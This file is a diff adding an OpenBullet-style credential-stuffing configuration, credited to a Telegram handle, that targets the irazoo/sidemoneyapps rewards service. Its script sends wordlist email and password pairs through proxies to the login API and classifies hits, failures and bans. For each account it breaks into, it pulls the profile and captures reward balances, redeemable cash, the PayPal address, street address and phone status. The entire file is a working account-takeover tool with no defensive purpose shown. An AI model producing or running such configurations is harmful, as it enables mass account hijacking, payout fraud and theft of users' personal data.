@@ -1,0 +1,124 @@
+[SETTINGS]
+{
+  "Name": "irazoo",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-11T22:32:41.0903232+02:00",
+  "AdditionalInfo": "http://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://backend.sidemoneyapps.com/api/v1/login/" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 61" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://app.irazoo.com" 
+  HEADER "referer: https://app.irazoo.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "Check your answers and try again" 
+    KEY "The provided details are incorrect" 
+  KEYCHAIN Ban OR 
+    KEY "page error" 
+
+#token PARSE "<SOURCE>" JSON "token" -> VAR "token" 
+
+REQUEST GET "https://backend.sidemoneyapps.com/api/v1/users/profiles/me/" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Token <token>" 
+  HEADER "origin: https://app.irazoo.com" 
+  HEADER "referer: https://app.irazoo.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+#first_name PARSE "<SOURCE>" JSON "first_name" -> VAR "first_name" 
+
+#Name PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "Name" "<first_name> " "" 
+
+#total_points PARSE "<SOURCE>" JSON "total_points" CreateEmpty=FALSE -> CAP "total_points" 
+
+#lifetime_points PARSE "<SOURCE>" JSON "lifetime_points" CreateEmpty=FALSE -> CAP "lifetime_points" 
+
+#redeemable_amount PARSE "<SOURCE>" JSON "redeemable_amount" CreateEmpty=FALSE -> CAP "redeemable_amount" 
+
+#paypal PARSE "<SOURCE>" JSON "paypal" CreateEmpty=FALSE -> CAP "paypal" 
+
+#address_line1 PARSE "<SOURCE>" JSON "address_line1" CreateEmpty=FALSE -> CAP "address_line1" 
+
+#gross_profit_points PARSE "<SOURCE>" JSON "gross_profit_points" CreateEmpty=FALSE -> CAP "gross_profit_points" 
+
+#approved_rewards_points PARSE "<SOURCE>" JSON "approved_rewards_points" CreateEmpty=FALSE -> CAP "approved_rewards_points" 
+
+#last_country_code PARSE "<SOURCE>" JSON "last_country_code" CreateEmpty=FALSE -> CAP "last_country_code" 
+
+#phone_verified PARSE "<SOURCE>" JSON "phone_verified" CreateEmpty=FALSE -> CAP "phone_verified" 
+
+FUNCTION Constant "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader" -> CAP "Checked By" 
+
